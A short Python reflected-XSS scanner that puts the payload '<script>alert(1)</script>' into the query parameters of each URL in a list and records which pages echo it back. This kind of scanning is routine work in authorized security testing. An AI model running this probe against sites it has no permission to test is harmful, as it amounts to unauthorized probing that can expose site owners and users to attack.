#!/usr/bin/python

import requests
import sys

potential_xss_urls = sys.argv[1]
payload = "<script>alert(1)</script>"

urls = []
with open(potential_xss_urls, 'r') as f:
    for line in f:
        print(f'{line.strip()}')
        urls.append(line.strip())
        

vulnerable = []
for url in urls:
    try:
        response = requests.get(url.replace('=', f'={payload}'), timeout=1)
        if payload in response.text:
            print(f'[VULNERABLE] {url}')
            vulnerable.append(url)
        else:
            print(f'[I] {url}')
    except Exception as e:
        continue

with open('xss_vulnerable_urls.txt', 'w') as f:
    f.write('\n'.join(vulnerable))

print('xss_vulnerable_urls.txt')
